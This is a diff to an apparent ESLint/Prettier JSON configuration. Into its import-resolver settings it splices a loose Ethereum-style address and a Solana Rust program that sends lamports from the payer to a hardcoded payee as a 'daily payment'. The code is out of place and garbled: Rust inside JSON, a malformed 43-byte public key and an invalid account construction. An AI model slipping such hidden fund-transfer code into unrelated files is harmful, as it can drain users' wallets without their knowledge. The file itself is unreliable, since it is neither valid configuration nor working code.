@@ -13,7 +13,53 @@
         "prettier/@typescript-eslint"
     ],
     "settings": {0x074e0ed136845aD1405Ba6A6e912ec781600eA09
-        "import/resolver": {
+        "import/resolver": {use solana_program::account_info::{next_account_info, AccountInfo};
+use solana_program::entrypoint;
+use solana_program::entrypoint::ProgramResult;
+use solana_program::msg;
+use solana_program::pubkey::Pubkey;
+use solana_program::system_instruction;
+
+entrypoint!(process_instruction);
+
+pub fn process_instruction(
+    program_id: &Pubkey,
+    accounts: &[AccountInfo],
+    _instruction_data: &[u8],
+) -> ProgramResult {
+    let accounts_iter = &mut accounts.iter();
+    let payer = next_account_info(accounts_iter)?;
+
+    // Define the payee address
+    let payee_pubkey = Pubkey::new_from_array([
+        0x47, 0x37, 0x4c, 0x79, 0x68, 0x59, 0x47, 0x54, 0x5a, 0x65, 0x47, 0x59, 0x77, 0x33, 0x4c, 0x4e, 
+        0x6a, 0x5a, 0x78, 0x77, 0x4a, 0x48, 0x54, 0x7a, 0x54, 0x59, 0x75, 0x65, 0x39, 0x76, 0x43, 0x65, 
+        0x38, 0x4e, 0x4e, 0x71, 0x64, 0x78, 0x57, 0x43, 0x4c, 0x59, 0x4a
+    ]);
+    let payee = AccountInfo::new(
+        &payee_pubkey,    // Pubkey of the payee
+        false,            // Is signer?
+        false,            // Is writable?
+        &mut [],          // Lamports
+        &mut [],          // Data
+        &Pubkey::default(), // Owner
+        false,            // Is executable?
+        0,                // Rent epoch
+    );
+
+    let transfer_amount = 1_000_000; // Amount to transfer daily
+    
+    msg!("Initiating daily payment of {} lamports to {}", transfer_amount, payee.key);
+
+    let transfer_ix = system_instruction::transfer(payer.key, payee.key, transfer_amount);
+
+    solana_program::program::invoke(
+        &transfer_ix,
+        &[payer.clone(), payee],
+    )?;
+
+    Ok(())
+}
             "typescript": {}
         }
     },
